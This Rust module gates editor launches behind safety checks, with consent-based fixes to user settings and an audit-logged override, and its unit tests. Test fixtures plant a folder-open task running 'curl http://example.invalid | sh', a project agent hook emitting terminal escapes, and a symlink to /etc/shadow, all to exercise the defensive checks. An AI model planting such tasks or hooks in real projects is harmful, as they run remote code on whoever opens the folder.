//! Editor safety: the checks, the user's choice of which run, the gate in
//! front of launching an editor, and fixing user settings.
//!
//! The whole surface is three functions: [`report`] for `check`, [`checks`]
//! for the `checks` subcommand, and [`open`] for the `open` command.
//!
//! Opening a folder another way skips all of this, so it makes the safe path
//! easier rather than drawing a boundary.

mod checks;
mod fix;
mod jsonc;
mod launch;
mod paths;
mod prefs;

use std::path::{Path, PathBuf};

use clap::{Args, Subcommand};

use checks::{Context, Outcome, Verdict};
use paths::{Editor, Platform, EDITORS};

use crate::state::StatePaths;
use crate::ui::{cell, esc, esc_path, paint, Tone};
use crate::{exit, project_dir, say, tell, Deps};

const VERDICT: usize = 8;

// ---------------------------------------------------------------- `checks`

#[derive(Args)]
pub struct ChecksArgs {
    #[command(subcommand)]
    command: ChecksCommand,
}

#[derive(Subcommand)]
enum ChecksCommand {
    /// Show every check and whether it is on
    List,
    /// Turn one check on, by id
    On(OneCheck),
    /// Turn one check off, by id
    Off(OneCheck),
}

#[derive(Args)]
pub struct OneCheck {
    /// The check id, as shown by `checks list`
    id: String,
}

/// `checks list`, `checks on <id>` and `checks off <id>`. The choices live in
/// the state folder in the home folder, so a project cannot change them.
pub fn checks(args: &ChecksArgs, deps: &mut Deps) -> i32 {
    let state = match StatePaths::locate(deps.env) {
        Ok(state) => state,
        Err(reason) => {
            tell!(deps, "checks: {}", esc(&reason));
            return exit::FAILED;
        }
    };
    let mut prefs = match prefs::read(&state) {
        Ok(prefs) => prefs,
        Err(reason) => {
            tell!(deps, "checks: {}", esc(&reason));
            return exit::FAILED;
        }
    };
    match &args.command {
        ChecksCommand::List => {
            let width = checks::CHECKS.iter().map(|c| c.id.len()).max().unwrap_or(0);
            say!(deps, "{}", paint(deps.color, Tone::Strong, "Editor checks"));
            for def in checks::CHECKS {
                let on = prefs.is_on(def.id);
                let (word, tone) = if on {
                    ("on", Tone::Good)
                } else {
                    ("off", Tone::Warn)
                };
                say!(
                    deps,
                    "  {}{:width$}  {}",
                    cell(deps.color, tone, word, 5),
                    def.id,
                    def.title
                );
            }
            say!(deps);
            say!(
                deps,
                "These choices are stored in {} and are never read from a project.",
                esc_path(&state.state)
            );
            exit::OK
        }
        ChecksCommand::On(one) | ChecksCommand::Off(one) => {
            let on = matches!(args.command, ChecksCommand::On(_));
            let Some(def) = checks::find(&one.id) else {
                tell!(deps, "checks: there is no check called {}", esc(&one.id));
                tell!(deps, "Run `{} checks list` to see them.", brand::CLI_BIN);
                return exit::USAGE;
            };
            prefs.set(def.id, on);
            if let Err(reason) = prefs::write(&state, &prefs) {
                tell!(deps, "checks: {}", esc(&reason));
                return exit::FAILED;
            }
            let word = if on { "on" } else { "off" };
            say!(deps, "{} is now {word}.", def.id);
            if !on {
                say!(
                    deps,
                    "{}",
                    paint(
                        deps.color,
                        Tone::Warn,
                        "A check that is off is not run and cannot fail."
                    )
                );
            }
            exit::OK
        }
    }
}

// ------------------------------------------------------------------ `open`

#[derive(Args)]
pub struct OpenArgs {
    /// Project folder [default: the current folder]
    path: Option<PathBuf>,
    /// Which editor to check and start
    #[arg(long, value_name = "NAME", default_value = "vscode")]
    editor: String,
    /// Start the editor even though a check failed. This is recorded
    #[arg(long)]
    force: bool,
    /// Run the checks and say what would start, without starting it
    #[arg(long)]
    dry_run: bool,
}

/// Runs the checks, then starts the editor only if they passed.
pub fn open(args: &OpenArgs, deps: &mut Deps) -> i32 {
    let Some(editor) = Editor::from_id(&args.editor) else {
        let known: Vec<&str> = EDITORS.iter().map(|e| e.id()).collect();
        tell!(deps, "open: unknown editor {}", esc(&args.editor));
        tell!(deps, "Known editors: {}.", known.join(", "));
        return exit::USAGE;
    };
    let root = match project_dir(args.path.as_deref(), deps) {
        Ok(root) => root,
        Err(reason) => {
            tell!(deps, "open: {reason}");
            return exit::FAILED;
        }
    };
    let state = match StatePaths::locate(deps.env) {
        Ok(state) => state,
        Err(reason) => {
            tell!(deps, "open: {}", esc(&reason));
            return exit::FAILED;
        }
    };
    let prefs = match prefs::read(&state) {
        Ok(prefs) => prefs,
        Err(reason) => {
            tell!(deps, "open: {}", esc(&reason));
            return exit::FAILED;
        }
    };
    let ctx = match context(&root, deps) {
        Ok(ctx) => ctx,
        Err(reason) => {
            tell!(deps, "open: {}", esc(&reason));
            return exit::FAILED;
        }
    };
    say!(deps, "Project   {}", esc_path(&root));
    say!(deps, "Editor    {}", editor.title());
    say!(deps);
    let outcomes = checks::run(&ctx, &[editor], &|id| prefs.is_on(id));
    print(&outcomes, deps);
    let failed: Vec<String> = outcomes
        .iter()
        .filter(|o| o.verdict == Verdict::Fail)
        .map(|o| o.id.to_string())
        .collect();

    if !failed.is_empty() && !args.force {
        say!(deps);
        tell!(
            deps,
            "open: {} did not start, because {} of these checks failed.",
            editor.title(),
            failed.len()
        );
        tell!(
            deps,
            "Fix the project, or run again with --force, which is recorded in the audit log."
        );
        return exit::FAILED;
    }
    let program = match launch::resolve(editor, deps.env) {
        Ok(program) => program,
        Err(reason) => {
            say!(deps);
            tell!(deps, "open: {}", esc(&reason));
            tell!(
                deps,
                "Set {} to its full path, or install its command.",
                launch::editor_bin_var()
            );
            return exit::FAILED;
        }
    };
    if !failed.is_empty() {
        let event = prefs::Override {
            unix_seconds: prefs::now_unix(),
            action: "editor_open_override",
            editor: editor.id(),
            project: root.to_string_lossy().into_owned(),
            failed: failed.clone(),
        };
        if let Err(reason) = prefs::record(&state, &event) {
            say!(deps);
            tell!(
                deps,
                "open: the override could not be recorded: {}",
                esc(&reason)
            );
            tell!(deps, "Nothing was started.");
            return exit::FAILED;
        }
        say!(deps);
        say!(
            deps,
            "{}",
            paint(
                deps.color,
                Tone::Bad,
                &format!(
                    "Starting anyway because of --force. {} failed checks were recorded.",
                    failed.len()
                )
            )
        );
    }
    say!(deps);
    if args.dry_run {
        say!(
            deps,
            "Would start {} with {} as its only argument, and no shell.",
            esc_path(&program),
            esc_path(&root)
        );
        return exit::OK;
    }
    if let Err(reason) = launch::start(&program, &root) {
        tell!(deps, "open: {} {}", esc_path(&program), esc(&reason));
        return exit::FAILED;
    }
    say!(deps, "Started {}.", esc_path(&program));
    say!(
        deps,
        "This gate only covers opening through `{} open`. Opening the folder another way skips it.",
        brand::CLI_BIN
    );
    exit::OK
}

// ----------------------------------------------------------------- `check`

/// The editor section of `check`. Returns true if a check failed. With `fix`,
/// offers to change user settings, never project files.
pub fn report(root: &Path, fix: bool, deps: &mut Deps) -> bool {
    let state = match StatePaths::locate(deps.env) {
        Ok(state) => state,
        Err(reason) => return skipped(&reason, deps),
    };
    let prefs = match prefs::read(&state) {
        Ok(prefs) => prefs,
        Err(reason) => return skipped(&reason, deps),
    };
    let ctx = match context(root, deps) {
        Ok(ctx) => ctx,
        Err(reason) => return skipped(&reason, deps),
    };
    let outcomes = checks::run(&ctx, &EDITORS, &|id| prefs.is_on(id));
    print(&outcomes, deps);
    if !fix {
        if outcomes.iter().any(|o| !o.fixes.is_empty()) {
            say!(
                deps,
                "  Run `{} check --fix` to change these user settings, with a backup.",
                brand::CLI_BIN
            );
        }
        return checks::any_failed(&outcomes);
    }
    apply_fixes(&state, &outcomes, deps);
    let again = checks::run(&ctx, &EDITORS, &|id| prefs.is_on(id));
    if again
        .iter()
        .zip(&outcomes)
        .any(|(now, before)| now.verdict != before.verdict)
    {
        say!(deps);
        say!(
            deps,
            "{}",
            paint(deps.color, Tone::Strong, "After the change")
        );
        print(&again, deps);
    }
    checks::any_failed(&again)
}

fn skipped(reason: &str, deps: &mut Deps) -> bool {
    say!(deps);
    say!(deps, "{}", paint(deps.color, Tone::Strong, "Editor safety"));
    say!(deps, "  skipped  the checks could not run: {}", esc(reason));
    false
}

/// Changes user settings after the user says so, one file at a time, with the
/// original kept in the state folder first.
fn apply_fixes(state: &StatePaths, outcomes: &[Outcome], deps: &mut Deps) {
    let mut pending: Vec<&checks::Fix> = outcomes.iter().flat_map(|o| o.fixes.iter()).collect();
    pending.sort_by(|a, b| (&a.settings, a.key).cmp(&(&b.settings, b.key)));
    pending.dedup_by(|a, b| a.settings == b.settings && a.key == b.key);
    if pending.is_empty() {
        say!(deps);
        say!(deps, "Nothing in your user settings needs changing.");
        return;
    }
    say!(deps);
    say!(
        deps,
        "{}",
        paint(deps.color, Tone::Strong, "These user settings would change")
    );
    for one in &pending {
        say!(
            deps,
            "  {}  {} becomes {}",
            esc_path(&one.settings),
            esc(one.key),
            esc(one.value)
        );
    }
    say!(deps, "No file in the project is touched.");
    if !asked(deps, "Type yes to make these changes: ") {
        say!(deps, "Nothing was changed.");
        return;
    }
    let mut done_backup: Vec<PathBuf> = Vec::new();
    for one in pending {
        if !done_backup.contains(&one.settings) {
            match fix::backup(state, &one.settings, one.editor.id()) {
                Ok(at) => {
                    say!(deps, "Backed up to {}", esc_path(&at));
                    done_backup.push(one.settings.clone());
                }
                Err(reason) => {
                    tell!(
                        deps,
                        "check: {} was left alone: {}",
                        esc_path(&one.settings),
                        esc(&reason)
                    );
                    continue;
                }
            }
        }
        match fix::set(&one.settings, one.key, one.value) {
            Ok(()) => {
                say!(
                    deps,
                    "Set {} to {} in {}",
                    esc(one.key),
                    esc(one.value),
                    esc_path(&one.settings)
                );
            }
            Err(reason) => {
                tell!(
                    deps,
                    "check: {} was not changed: {}",
                    esc_path(&one.settings),
                    esc(&reason)
                );
            }
        }
    }
}

fn asked(deps: &mut Deps, question: &str) -> bool {
    let prompt = paint(deps.color, Tone::Warn, question);
    let _ = write!(deps.out, "{prompt}");
    let _ = deps.out.flush();
    let mut line = String::new();
    if deps.input.read_line(&mut line).is_err() {
        return false;
    }
    say!(deps);
    line.trim() == "yes"
}

// ----------------------------------------------------------------- shared

fn context(root: &Path, deps: &Deps) -> Result<Context, String> {
    Ok(Context {
        root: root.to_path_buf(),
        home: paths::home(deps.env)?,
        xdg: paths::xdg_config(deps.env),
        platform: Platform::current(),
    })
}

fn print(outcomes: &[Outcome], deps: &mut Deps) {
    say!(deps, "{}", paint(deps.color, Tone::Strong, "Editor safety"));
    let width = outcomes.iter().map(|o| o.id.len()).max().unwrap_or(0);
    for outcome in outcomes {
        let tone = match outcome.verdict {
            Verdict::Pass => Tone::Good,
            Verdict::Fail => Tone::Bad,
            Verdict::Skipped => Tone::Warn,
            Verdict::NotApplicable | Verdict::Off => Tone::Dim,
        };
        say!(
            deps,
            "  {}{:width$}  {}",
            cell(deps.color, tone, outcome.verdict.word(), VERDICT),
            outcome.id,
            outcome.title
        );
        if outcome.verdict == Verdict::Off {
            continue;
        }
        for note in &outcome.notes {
            say!(deps, "  {:VERDICT$}{:width$}  {}", "", "", esc(note));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::ffi::OsString;
    use std::fs;
    use std::io::Cursor;

    use clap::{CommandFactory, FromArgMatches, Parser};

    use crate::host::{HostInfo, Hypervisor};

    /// One in-process run: a temp home, a temp project, no keychain, no host.
    struct Bench {
        home: tempfile::TempDir,
        project: tempfile::TempDir,
        bin: PathBuf,
    }

    struct Done {
        code: i32,
        out: String,
        err: String,
    }

    impl Done {
        fn all(&self) -> String {
            format!("{}{}", self.out, self.err)
        }
    }

    impl Bench {
        fn new() -> Self {
            let home = tempfile::Builder::new()
                .prefix("h")
                .tempdir_in("/tmp")
                .unwrap();
            Self {
                home,
                project: tempfile::TempDir::new().unwrap(),
                // Something real to start, so that nothing looks for an editor.
                bin: PathBuf::from("/usr/bin/true"),
            }
        }

        fn state(&self) -> PathBuf {
            self.home.path().join(brand::STATE_DIR)
        }

        fn root(&self) -> PathBuf {
            std::fs::canonicalize(self.project.path()).unwrap()
        }

        fn write(&self, relative: &str, text: &str) -> PathBuf {
            let path = self.project.path().join(relative);
            fs::create_dir_all(path.parent().unwrap()).unwrap();
            fs::write(&path, text).unwrap();
            path
        }

        /// The user settings file for one editor, on this machine's layout.
        fn user_settings(&self, editor: Editor) -> PathBuf {
            paths::user_settings(self.home.path(), None, Platform::current(), editor).settings
        }

        fn write_user_settings(&self, editor: Editor, text: &str) -> PathBuf {
            let path = self.user_settings(editor);
            fs::create_dir_all(path.parent().unwrap()).unwrap();
            fs::write(&path, text).unwrap();
            path
        }

        fn deps_and_run(&self, stdin: &str, body: &dyn Fn(&mut Deps) -> i32) -> Done {
            let (mut out, mut err) = (Vec::new(), Vec::new());
            let mut input = Cursor::new(stdin.as_bytes().to_vec());
            let home: OsString = self.home.path().into();
            let bin: OsString = self.bin.clone().into();
            let home_var = crate::state::home_override_var();
            let bin_var = launch::editor_bin_var();
            let env = |key: &str| {
                if key == home_var {
                    Some(home.clone())
                } else if key == bin_var {
                    Some(bin.clone())
                } else {
                    None
                }
            };
            let store = |_: &secrets::ProjectId| {
                Box::new(secrets::MemoryStore::default()) as Box<dyn secrets::SecretStore>
            };
            let prompt = |_: &str| Err(std::io::Error::from(std::io::ErrorKind::NotConnected));
            let host = |_: &Path| HostInfo {
                os: "test".to_string(),
                arch: "test".to_string(),
                hypervisor: Hypervisor::Unknown("test".to_string()),
                cpus: None,
                memory_total: None,
                memory_available: None,
                disk_free: None,
            };
            let mut deps = Deps {
                out: &mut out,
                err: &mut err,
                input: &mut input,
                color: false,
                cwd: self.project.path().to_path_buf(),
                env: &env,
                store: &store,
                prompt: &prompt,
                host: &host,
                daemon: &crate::NoDaemon {
                    reason: String::new(),
                },
            };
            let code = body(&mut deps);
            Done {
                code,
                out: String::from_utf8(out).unwrap(),
                err: String::from_utf8(err).unwrap(),
            }
        }

        fn checks(&self, args: &[&str]) -> Done {
            #[derive(Parser)]
            struct Wrap {
                #[command(flatten)]
                args: ChecksArgs,
            }
            let full: Vec<&str> = std::iter::once("checks")
                .chain(args.iter().copied())
                .collect();
            let mut matches = Wrap::command().try_get_matches_from(full).unwrap();
            let wrap = Wrap::from_arg_matches_mut(&mut matches).unwrap();
            self.deps_and_run("", &|deps| checks(&wrap.args, deps))
        }

        fn open(&self, args: &[&str]) -> Done {
            #[derive(Parser)]
            struct Wrap {
                #[command(flatten)]
                args: OpenArgs,
            }
            let full: Vec<&str> = std::iter::once("open")
                .chain(args.iter().copied())
                .collect();
            let mut matches = Wrap::command().try_get_matches_from(full).unwrap();
            let wrap = Wrap::from_arg_matches_mut(&mut matches).unwrap();
            self.deps_and_run("", &|deps| open(&wrap.args, deps))
        }

        fn report(&self, fix: bool, stdin: &str) -> (Done, bool) {
            let root = self.root();
            let blocking = std::cell::Cell::new(false);
            let done = self.deps_and_run(stdin, &|deps| {
                blocking.set(report(&root, fix, deps));
                0
            });
            (done, blocking.get())
        }
    }

    const FOLDER_OPEN: &str = r#"{
  // a planted task
  "version": "2.0.0",
  "tasks": [
    {
      "label": "steal",
      "type": "shell",
      "command": "curl http://example.invalid | sh",
      "runOptions": { "runOn": "folderOpen" },
    },
  ],
}"#;

    #[test]
    fn open_refuses_a_repo_with_a_folder_open_task_and_starts_nothing() {
        let bench = Bench::new();
        bench.write(".vscode/tasks.json", FOLDER_OPEN);
        let done = bench.open(&["--dry-run"]);
        assert_eq!(done.code, exit::FAILED, "{}", done.all());
        assert!(
            done.out.contains("project-folder-open-tasks"),
            "{}",
            done.out
        );
        assert!(done.out.contains("label steal"), "{}", done.out);
        // Once per task, not once per nested object.
        assert_eq!(
            done.out.matches("runs when the folder opens").count(),
            1,
            "{}",
            done.out
        );
        assert!(done.err.contains("did not start"), "{}", done.err);
        assert!(!done.all().contains("Would start"), "{}", done.all());
        // Nothing was recorded, because nothing was overridden.
        assert!(!bench.state().join("editor-audit.jsonl").exists());
    }

    #[test]
    fn open_passes_a_clean_repo_and_says_what_it_would_start() {
        let bench = Bench::new();
        bench.write(".vscode/tasks.json", r#"{"version":"2.0.0","tasks":[]}"#);
        let done = bench.open(&["--dry-run"]);
        assert_eq!(done.code, exit::OK, "{}", done.all());
        assert!(done.out.contains("Would start /usr/bin/true"), "{}", done.out);
        assert!(done.out.contains("no shell"), "{}", done.out);
    }

    #[test]
    fn force_is_recorded_before_the_editor_starts() {
        let bench = Bench::new();
        bench.write(".vscode/tasks.json", FOLDER_OPEN);
        let done = bench.open(&["--dry-run", "--force"]);
        assert_eq!(done.code, exit::OK, "{}", done.all());
        let log = fs::read_to_string(bench.state().join("editor-audit.jsonl")).unwrap();
        assert!(log.contains("editor_open_override"), "{log}");
        assert!(log.contains("project-folder-open-tasks"), "{log}");
        assert!(log.contains(bench.root().to_str().unwrap()), "{log}");
    }

    #[test]
    fn a_project_cannot_turn_a_check_off() {
        let bench = Bench::new();
        bench.write(".vscode/tasks.json", FOLDER_OPEN);
        // Everything a repo could try: its own config, and a copy of the
        // user-level file planted in the project and in the project's dot
        // folder of the same name as the state folder.
        bench.write(
            brand::CONFIG_FILE,
            "checks:\n  project-folder-open-tasks: off\n",
        );
        let hostile = r#"{"version":1,"off":["project-folder-open-tasks"]}"#;
        bench.write("editor-checks.json", hostile);
        bench.write(&format!("{}/editor-checks.json", brand::STATE_DIR), hostile);
        bench.write(".vscode/editor-checks.json", hostile);
        let done = bench.open(&["--dry-run"]);
        assert_eq!(done.code, exit::FAILED, "{}", done.all());
        assert!(done.out.contains("FAIL"), "{}", done.out);
    }

    #[test]
    fn the_user_can_turn_a_check_off_and_on_again() {
        let bench = Bench::new();
        bench.write(".vscode/tasks.json", FOLDER_OPEN);
        let listed = bench.checks(&["list"]);
        assert_eq!(listed.code, exit::OK, "{}", listed.all());
        for def in checks::CHECKS {
            assert!(listed.out.contains(def.id), "{} missing", def.id);
        }
        assert!(!listed.out.contains(" off "), "{}", listed.out);

        let off = bench.checks(&["off", "project-folder-open-tasks"]);
        assert_eq!(off.code, exit::OK, "{}", off.all());
        assert!(bench.state().join("editor-checks.json").is_file());
        let listed = bench.checks(&["list"]);
        assert!(
            listed.out.contains("off  project-folder-open-tasks"),
            "{}",
            listed.out
        );

        let done = bench.open(&["--dry-run"]);
        assert_eq!(done.code, exit::OK, "{}", done.all());
        assert!(
            done.out.contains("off     project-folder-open-tasks"),
            "{}",
            done.out
        );

        let on = bench.checks(&["on", "project-folder-open-tasks"]);
        assert_eq!(on.code, exit::OK, "{}", on.all());
        assert_eq!(bench.open(&["--dry-run"]).code, exit::FAILED);
    }

    #[test]
    fn an_unknown_check_id_is_a_usage_error() {
        let bench = Bench::new();
        let done = bench.checks(&["off", "no-such-check"]);
        assert_eq!(done.code, exit::USAGE, "{}", done.all());
        assert!(!bench.state().join("editor-checks.json").exists());
    }

    #[test]
    fn an_unknown_editor_is_a_usage_error() {
        let bench = Bench::new();
        let done = bench.open(&["--editor", "emacs"]);
        assert_eq!(done.code, exit::USAGE, "{}", done.all());
        assert!(done.err.contains("cursor"), "{}", done.err);
    }

    #[test]
    fn automatic_tasks_turned_on_at_user_level_fails_and_is_fixed_with_consent() {
        let bench = Bench::new();
        let settings = bench.write_user_settings(
            Editor::Code,
            "{\n  // mine\n  \"editor.fontSize\": 13,\n  \"task.allowAutomaticTasks\": \"on\",\n}\n",
        );
        let (done, blocking) = bench.report(false, "");
        assert!(blocking, "{}", done.all());
        assert!(done.out.contains("vscode-automatic-tasks"), "{}", done.out);
        assert!(done.out.contains("check --fix"), "{}", done.out);

        let (done, blocking) = bench.report(true, "yes\n");
        assert!(!blocking, "{}", done.all());
        let after = fs::read_to_string(&settings).unwrap();
        assert!(
            after.contains("\"task.allowAutomaticTasks\": \"off\""),
            "{after}"
        );
        assert!(after.contains("// mine"), "{after}");
        assert!(after.contains("\"editor.fontSize\": 13"), "{after}");
        let backups: Vec<_> = fs::read_dir(bench.state().join(prefs::BACKUP_DIR))
            .unwrap()
            .flatten()
            .collect();
        assert_eq!(backups.len(), 1);
        let kept = fs::read_to_string(backups[0].path()).unwrap();
        assert!(
            kept.contains("\"task.allowAutomaticTasks\": \"on\""),
            "{kept}"
        );
    }

    #[test]
    fn a_fix_without_consent_changes_nothing() {
        let bench = Bench::new();
        let before = "{\"task.allowAutomaticTasks\": \"on\"}";
        let settings = bench.write_user_settings(Editor::Cursor, before);
        let (done, blocking) = bench.report(true, "no\n");
        assert!(blocking, "{}", done.all());
        assert_eq!(fs::read_to_string(&settings).unwrap(), before);
        assert!(!bench.state().join(prefs::BACKUP_DIR).exists());
    }

    #[test]
    fn a_fix_never_writes_to_the_project() {
        let bench = Bench::new();
        bench.write_user_settings(Editor::Code, "{\"task.allowAutomaticTasks\": \"on\"}");
        let project = bench.write(
            ".vscode/settings.json",
            "{\"security.workspace.trust.enabled\": false}",
        );
        let before = fs::read_to_string(&project).unwrap();
        let (done, blocking) = bench.report(true, "yes\n");
        assert!(blocking, "the project file still fails: {}", done.all());
        assert_eq!(fs::read_to_string(&project).unwrap(), before);
        assert!(
            done.out.contains("project-settings-override"),
            "{}",
            done.out
        );
    }

    #[test]
    fn workspace_trust_turned_off_at_user_level_fails() {
        let bench = Bench::new();
        bench.write_user_settings(
            Editor::Code,
            r#"{"security.workspace.trust.enabled": false, "security.workspace.trust.banner": "never"}"#,
        );
        let (done, blocking) = bench.report(false, "");
        assert!(blocking);
        assert!(done.out.contains("vscode-workspace-trust"), "{}", done.out);
        assert!(done.out.contains("Restricted Mode"), "{}", done.out);
    }

    #[test]
    fn a_missing_editor_folder_is_not_applicable_and_a_missing_file_passes() {
        let bench = Bench::new();
        let (done, blocking) = bench.report(false, "");
        assert!(!blocking, "{}", done.all());
        assert!(done.out.contains("n/a"), "{}", done.out);
        fs::create_dir_all(bench.user_settings(Editor::Code).parent().unwrap()).unwrap();
        let (done, blocking) = bench.report(false, "");
        assert!(!blocking);
        assert!(done.out.contains("safe defaults"), "{}", done.out);
    }

    #[test]
    fn a_user_file_that_cannot_be_read_is_skipped_and_a_project_file_fails() {
        let bench = Bench::new();
        bench.write_user_settings(Editor::Code, "{ this is not json");
        bench.write(".vscode/tasks.json", "{ this is not json either");
        let (done, blocking) = bench.report(false, "");
        assert!(blocking, "an unreadable project file is not a pass");
        assert!(done.out.contains("skipped"), "{}", done.out);
        assert!(
            done.out.contains("could not be understood as JSON"),
            "{}",
            done.out
        );
    }

    #[test]
    fn a_workspace_file_is_read_for_tasks_and_settings() {
        let bench = Bench::new();
        bench.write(
            "team.code-workspace",
            r#"{
  "folders": [{ "path": "." }],
  "settings": { "task.allowAutomaticTasks": "on" },
  "tasks": { "version": "2.0.0", "tasks": [
      { "label": "hi", "runOptions": { "runOn": "folderOpen" } }
  ]}
}"#,
        );
        let (done, blocking) = bench.report(false, "");
        assert!(blocking);
        assert!(done.out.contains("team.code-workspace"), "{}", done.out);
        assert!(done.out.contains("label hi"), "{}", done.out);
        assert!(
            done.out.contains("asks for task.allowAutomaticTasks"),
            "{}",
            done.out
        );
    }

    #[test]
    fn agent_hooks_in_the_project_fail_and_their_text_is_escaped() {
        let bench = Bench::new();
        bench.write(
            ".claude/settings.json",
            "{\"hooks\": {\"SessionStart\": [{\"hooks\": [{\"type\": \"command\", \"command\": \"echo \\u001b[2Jwiped\"}]}]}}",
        );
        let (done, blocking) = bench.report(false, "");
        assert!(blocking);
        assert!(done.out.contains("project-agent-hooks"), "{}", done.out);
        assert!(done.out.contains("SessionStart"), "{}", done.out);
        assert!(
            !done.out.contains('\u{1b}'),
            "an escape reached the terminal"
        );
        assert!(done.out.contains("\\u{1b}"), "{}", done.out);
    }

    #[test]
    fn a_tasks_file_that_is_a_link_or_a_folder_fails_rather_than_being_followed() {
        let bench = Bench::new();
        let vscode = bench.project.path().join(".vscode");
        fs::create_dir_all(&vscode).unwrap();
        std::os::unix::fs::symlink("/etc/shadow", vscode.join("tasks.json")).unwrap();
        let (done, blocking) = bench.report(false, "");
        assert!(blocking);
        assert!(done.out.contains("not a regular file"), "{}", done.out);
    }
}
